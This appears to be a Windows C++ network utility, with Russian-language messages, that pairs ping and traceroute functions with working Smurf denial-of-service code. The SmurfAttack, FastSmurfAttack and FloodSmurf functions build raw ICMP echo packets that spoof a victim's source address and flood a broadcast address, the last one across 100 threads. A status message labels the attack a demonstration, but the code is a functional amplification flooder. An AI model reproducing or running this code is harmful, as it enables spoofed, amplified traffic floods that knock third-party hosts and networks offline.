#include "main.h"
#include "int_handler.cpp"
#include "menu.cpp"

void InitializeWinsock() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        throw std::runtime_error("WSAStartup failed: " + std::to_string(WSAGetLastError()));
    }
}

void CleanupWinsock() {
    WSACleanup();
}

HANDLE CreateIcmpHandle() {
    HANDLE hIcmp = IcmpCreateFile();
    if (hIcmp == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("IcmpCreateFile failed: " + GetErrorDescription(GetLastError()));
    }
    return hIcmp;
}

PingResult PingHost(const std::string& host, int timeout, int ttl) {
    PingResult result;
    result.ip = host;
    result.success = false;

    HANDLE hIcmp = INVALID_HANDLE_VALUE;
    char* replyBuffer = nullptr;

    try {
        sockaddr_in destAddr = ResolveHost(host);
        result.ip = inet_ntoa(destAddr.sin_addr);

        hIcmp = CreateIcmpHandle();

        char sendData[PACKET_SIZE];
        memset(sendData, 'A', PACKET_SIZE);

        DWORD replySize = sizeof(ICMP_ECHO_REPLY) + PACKET_SIZE;
        replyBuffer = (char*)malloc(replySize);

        IP_OPTION_INFORMATION options;
        memset(&options, 0, sizeof(options));
        options.Ttl = ttl;

        DWORD dwRet = IcmpSendEcho2(
                hIcmp,
                NULL,
                NULL,
                NULL,
                destAddr.sin_addr.s_addr,
                sendData,
                PACKET_SIZE,
                &options,
                replyBuffer,
                replySize,
                timeout
        );

        if (dwRet == 0) {
            DWORD error = GetLastError();
            result.error = "IcmpSendEcho failed: " + GetErrorDescription(error);
        } else {
            ICMP_ECHO_REPLY* reply = (ICMP_ECHO_REPLY*)replyBuffer;
            result.bytes = reply->DataSize;
            result.time = reply->RoundTripTime;
            result.ttl = reply->Options.Ttl;
            result.success = true;
        }
    } catch (const std::exception& e) {
        result.error = e.what();
    }

    if (replyBuffer) free(replyBuffer);
    if (hIcmp != INVALID_HANDLE_VALUE) IcmpCloseHandle(hIcmp);

    return result;
}

void PrintPingResult(const PingResult& result) {
    if (result.success) {
        std::cout << "Ответ от " << result.ip
                  << ": число байт=" << result.bytes
                  << " время=" << result.time << "мс"
                  << " TTL=" << result.ttl << std::endl;
    } else {
        std::cerr << "Ошибка пинга " << result.ip << ": " << result.error << std::endl;
    }
}

void ContinuousPing(const std::string& host, int count) {
    std::cout << "Обмен пакетами с " << host << "(Ctrl+C для остановки):" << std::endl;
    g_shouldStop = false;

    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
        std::cerr << "Ошибка установки обработчика Ctrl+C" << std::endl;
        return;
    }

    for (int i = 0; (i < count || count == 0) && !g_shouldStop; i++) {
        PingResult result = PingHost(host);
        PrintPingResult(result);

        if (i < count - 1 || count == 0 && !g_shouldStop) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}

void MultiPing(const std::vector<std::string>& hosts) {
    std::vector<std::thread> threads;
    std::vector<PingResult> results(hosts.size());

    for (size_t i = 0; i < hosts.size(); i++) {
        threads.emplace_back([&results, i, &hosts]() {
            results[i] = PingHost(hosts[i]);
        });
    }

    for (auto& t : threads) {
        t.join();
    }

    for (const auto& result : results) {
        PrintPingResult(result);
    }
}

std::vector<TraceRouteResult> TraceRoute(const std::string& host, int max_hops) {
    std::vector<TraceRouteResult> results;
    HANDLE hIcmp = INVALID_HANDLE_VALUE;
    char* replyBuffer = nullptr;

    try {
        sockaddr_in destAddr = ResolveHost(host);
        hIcmp = CreateIcmpHandle();

        char sendData[PACKET_SIZE];
        memset(sendData, 0, PACKET_SIZE);

        // Увеличиваем размер буфера для получения дополнительной информации
        DWORD replySize = sizeof(ICMP_ECHO_REPLY) + PACKET_SIZE + 8;
        replyBuffer = (char*)malloc(replySize);

        std::cout << "Трассировка маршрута к " << inet_ntoa(destAddr.sin_addr)
                  << " с максимальным числом прыжков " << max_hops << ":\n";

        for (int ttl = 1; ttl <= max_hops; ttl++) {
            IP_OPTION_INFORMATION options;
            memset(&options, 0, sizeof(options));
            options.Ttl = (UCHAR)ttl;
            options.Flags = IP_FLAG_DF;

            TraceRouteResult hopResult;
            hopResult.hop = ttl;
            hopResult.is_final = false;

            DWORD startTime = GetTickCount();
            DWORD dwRet = IcmpSendEcho2(
                    hIcmp,
                    NULL,
                    NULL,
                    NULL,
                    destAddr.sin_addr.s_addr,
                    sendData,
                    PACKET_SIZE,
                    &options,
                    replyBuffer,
                    replySize,
                    DEFAULT_TIMEOUT
            );

            hopResult.time = GetTickCount() - startTime;

            if (dwRet == 0) {
                DWORD error = GetLastError();
                if (error == IP_REQ_TIMED_OUT) {
                    hopResult.ip = "*";
                    results.push_back(hopResult);
                    continue;
                } else {
                    hopResult.ip = "Ошибка: " + GetErrorDescription(error);
                    results.push_back(hopResult);
                    break;
                }
            }

            ICMP_ECHO_REPLY* reply = (ICMP_ECHO_REPLY*)replyBuffer;
            hopResult.ip = IpToString(reply->Address);

            if (reply->Status == IP_SUCCESS) {
                hopResult.is_final = true;
                results.push_back(hopResult);
                break;
            }

            results.push_back(hopResult);
        }
    } catch (const std::exception& e) {
        TraceRouteResult errorResult;
        errorResult.hop = results.size() + 1;
        errorResult.ip = "Ошибка: " + std::string(e.what());
        results.push_back(errorResult);
    }

    if (replyBuffer) free(replyBuffer);
    if (hIcmp != INVALID_HANDLE_VALUE) IcmpCloseHandle(hIcmp);

    return results;
}

void PrintTraceRoute(const std::vector<TraceRouteResult>& results) {
    for (const auto& hop : results) {
        std::cout << std::setw(2) << hop.hop << "  ";
        if (hop.time > 0) {
            std::cout << std::setw(8) << hop.time << " мс  ";
        } else {
            std::cout << "    *      ";
        }
        std::cout << hop.ip;
        if (hop.is_final) {
            std::cout << "  <-- Конечный пункт";
        }
        std::cout << std::endl;
    }
}

void FastSmurfAttack(const std::string& victim, const std::string& broadcast, int count)
{
    SOCKET sock = INVALID_SOCKET;
    char* packet = nullptr;

    try {
        InitializeWinsock();

        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Не удалось создать raw socket: " + std::to_string(WSAGetLastError()));
        }

        // включаем ручную сборку IP-заголовка
        DWORD flag = 1;
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) == SOCKET_ERROR) {
            throw std::runtime_error("setsockopt(IP_HDRINCL) failed: " + std::to_string(WSAGetLastError()));
        }

        sockaddr_in destAddr{};
        destAddr.sin_family = AF_INET;
        destAddr.sin_addr.s_addr = inet_addr(broadcast.c_str());

        sockaddr_in victimAddr{};
        victimAddr.sin_family = AF_INET;
        victimAddr.sin_addr.s_addr = inet_addr(victim.c_str());

        int packetLen = sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE;
        packet = new char[packetLen];
        memset(packet, 0, packetLen);

        // IP заголовок
        IP_HEADER* ipHeader = (IP_HEADER*)packet;
        ipHeader->ip_verlen = (4 << 4) | (sizeof(IP_HEADER) / sizeof(unsigned int));
        ipHeader->ip_tos = 0;
        ipHeader->ip_totallength = htons(packetLen);
        ipHeader->ip_id = htons(GetCurrentProcessId());
        ipHeader->ip_offset = 0;
        ipHeader->ip_ttl = 255;
        ipHeader->ip_protocol = IPPROTO_ICMP;
        ipHeader->ip_srcaddr = victimAddr.sin_addr.s_addr;
        ipHeader->ip_destaddr = destAddr.sin_addr.s_addr;

        // ICMP заголовок
        ICMP_HEADER* icmpHeader = (ICMP_HEADER*)(packet + sizeof(IP_HEADER));
        icmpHeader->type = 8; // Echo request
        icmpHeader->code = 0;
        icmpHeader->id = htons(GetCurrentProcessId());

        // Payload заполняем мусором
        memset(packet + sizeof(IP_HEADER) + sizeof(ICMP_HEADER), 'A', PACKET_SIZE);

        std::cout << "Fast Smurf запущен -> Victim: " << victim
                  << " Broadcast: " << broadcast
                  << " Count: " << count << std::endl;

        for (int i = 0; i < count && !g_shouldStop; i++) {
            // обновляем seq и контрольные суммы
            icmpHeader->seq = htons(i);
            icmpHeader->checksum = 0;
            icmpHeader->checksum = CalculateChecksum(
                    (unsigned short*)icmpHeader,
                    sizeof(ICMP_HEADER) + PACKET_SIZE
            );

            ipHeader->ip_checksum = 0;
            ipHeader->ip_checksum = CalculateChecksum(
                    (unsigned short*)ipHeader,
                    sizeof(IP_HEADER)
            );

            if (sendto(sock, packet, packetLen, 0,
                       (sockaddr*)&destAddr, sizeof(destAddr)) == SOCKET_ERROR) {
                std::cerr << "sendto failed: " << WSAGetLastError() << std::endl;
                break;
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Ошибка Smurf: " << e.what() << std::endl;
    }

    if (packet) delete[] packet;
    if (sock != INVALID_SOCKET) closesocket(sock);
    CleanupWinsock();
}

void SmurfAttack(const std::string& victim, const std::string& broadcast, int count) {
    SOCKET sock = INVALID_SOCKET;
    char* packet = nullptr;

    try {
        InitializeWinsock();

        // Создаем raw socket с высоким приоритетом
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Не удалось создать raw socket: " + std::to_string(WSAGetLastError()));
        }

        // Увеличиваем размер буфера отправки
        int sendBufSize = 65536;
        if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)&sendBufSize, sizeof(sendBufSize)) == SOCKET_ERROR) {
            std::cerr << "Warning: Не удалось увеличить буфер отправки" << std::endl;
        }

        // Включаем возможность указания своего IP заголовка
        DWORD flag = 1;
        if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) == SOCKET_ERROR) {
            throw std::runtime_error("setsockopt(IP_HDRINCL) failed: " + std::to_string(WSAGetLastError()));
        }

        // Подготовка адресов
        sockaddr_in destAddr;
        memset(&destAddr, 0, sizeof(destAddr));
        destAddr.sin_family = AF_INET;
        destAddr.sin_addr.s_addr = inet_addr(broadcast.c_str());

        sockaddr_in victimAddr;
        memset(&victimAddr, 0, sizeof(victimAddr));
        victimAddr.sin_family = AF_INET;
        victimAddr.sin_addr.s_addr = inet_addr(victim.c_str());

        // Создаем шаблон пакета один раз
        packet = new char[sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE];
        memset(packet, 0, sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE);

        // Заполняем IP заголовок
        IP_HEADER* ipHeader = (IP_HEADER*)packet;
        ipHeader->ip_verlen = (4 << 4) | (sizeof(IP_HEADER) / sizeof(unsigned int));
        ipHeader->ip_tos = 0;
        ipHeader->ip_totallength = htons(sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE);
        ipHeader->ip_id = htons(GetCurrentProcessId());
        ipHeader->ip_offset = 0;
        ipHeader->ip_ttl = 255;
        ipHeader->ip_protocol = IPPROTO_ICMP;
        ipHeader->ip_checksum = 0;
        ipHeader->ip_srcaddr = victimAddr.sin_addr.s_addr;
        ipHeader->ip_destaddr = destAddr.sin_addr.s_addr;

        // Заполняем ICMP заголовок
        ICMP_HEADER* icmpHeader = (ICMP_HEADER*)(packet + sizeof(IP_HEADER));
        icmpHeader->type = 8; // ICMP_ECHO
        icmpHeader->code = 0;
        icmpHeader->id = htons(GetCurrentProcessId());
        icmpHeader->seq = htons(0);
        memset(packet + sizeof(IP_HEADER) + sizeof(ICMP_HEADER), 'A', PACKET_SIZE);

        // Вычисляем контрольные суммы один раз
        icmpHeader->checksum = CalculateChecksum((unsigned short*)icmpHeader,
                                                 sizeof(ICMP_HEADER) + PACKET_SIZE);
        ipHeader->ip_checksum = CalculateChecksum((unsigned short*)ipHeader, sizeof(IP_HEADER));

        std::cout << "Начало Smurf-атаки (демонстрация) с параметрами:\n"
                  << "  Жертва: " << victim << "\n"
                  << "  Broadcast: " << broadcast << "\n"
                  << "  Количество пакетов: " << count << "\n\n";

        // Уменьшаем задержку между пакетами
        const int packets_per_burst = 10; // Пакетов в одной "пачке"
        const int delay_ms = 100;       // Задержка между пачками

        for (int i = 0; i < count && !g_shouldStop; i++) {
            // Отправляем несколько пакетов сразу
            for (int j = 0; j < packets_per_burst && i < count; j++, i++) {
                // Обновляем sequence number для каждого пакета
                icmpHeader->seq = htons(i);
                icmpHeader->checksum = 0;
                icmpHeader->checksum = CalculateChecksum((unsigned short*)icmpHeader,
                                                         sizeof(ICMP_HEADER) + PACKET_SIZE);

                if (sendto(sock, packet, sizeof(IP_HEADER) + sizeof(ICMP_HEADER) + PACKET_SIZE, 0,
                           (sockaddr*)&destAddr, sizeof(destAddr)) == SOCKET_ERROR) {
                    std::cerr << "sendto failed: " << WSAGetLastError() << std::endl;
                    break;
                }
                std::cout << "Отправлен пакет " << i + 1 << "/" << count << "\r";
            }

            if (i < count - 1 && !g_shouldStop) {
                Sleep(delay_ms);
            }
        }
        std::cout << std::endl;
    } catch (const std::exception& e) {
        std::cerr << "Ошибка Smurf-атаки: " << e.what() << std::endl;
    }

    if (packet) delete[] packet;
    if (sock != INVALID_SOCKET) closesocket(sock);
    CleanupWinsock();
}

// Более агрессивная версия
void FloodSmurf(const std::string& victim, const std::string& broadcast, int count) {
    std::vector<std::thread> threads;
    for (int i = 0; i < 100; i++) {
        threads.emplace_back([victim, broadcast, count]() {
            SmurfAttack(victim, broadcast, count);
        });
    }
    for (auto& t : threads) t.join();
}

std::string GetErrorDescription(DWORD error) {
    switch (error) {
        case ERROR_ACCESS_DENIED: return "Требуются права администратора";
        case IP_BUF_TOO_SMALL: return "Буфер слишком мал";
        case IP_REQ_TIMED_OUT: return "Таймаут запроса";
        case IP_DEST_HOST_UNREACHABLE: return "Хост недостижим";
        case IP_DEST_NET_UNREACHABLE: return "Сеть недостижима";
        case IP_DEST_PROT_UNREACHABLE: return "Протокол недостижим";
        case IP_DEST_PORT_UNREACHABLE: return "Порт недостижим";
        case IP_NO_RESOURCES: return "Недостаточно ресурсов";
        case IP_BAD_ROUTE: return "Ошибка маршрутизации";
        default: return "Неизвестная ошибка (" + std::to_string(error) + ")";
    }
}

sockaddr_in ResolveHost(const std::string& host) {
    sockaddr_in destAddr;
    memset(&destAddr, 0, sizeof(destAddr));
    destAddr.sin_family = AF_INET;

    if (host == "localhost" || host == "127.0.0.1") {
        destAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
        return destAddr;
    }

    if (inet_pton(AF_INET, host.c_str(), &destAddr.sin_addr) == 1) {
        return destAddr;
    }

    addrinfo hints = {0}, *result = nullptr;
    hints.ai_family = AF_INET;

    if (getaddrinfo(host.c_str(), nullptr, &hints, &result) != 0) {
        throw std::runtime_error("Не удалось разрешить имя хоста: " + host);
    }

    destAddr.sin_addr = ((sockaddr_in*)result->ai_addr)->sin_addr;
    freeaddrinfo(result);

    return destAddr;
}

std::string IpToString(DWORD ip) {
    in_addr addr;
    addr.s_addr = ip;
    return inet_ntoa(addr);
}

DWORD StringToIp(const std::string& ipStr) {
    return inet_addr(ipStr.c_str());
}

unsigned short CalculateChecksum(unsigned short* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        cksum += *(unsigned char*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (unsigned short)(~cksum);
}

int main() {
    try {
        InitializeWinsock();
        menu();
        CleanupWinsock();
    } catch (const std::exception& e) {
        std::cerr << "Ошибка: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}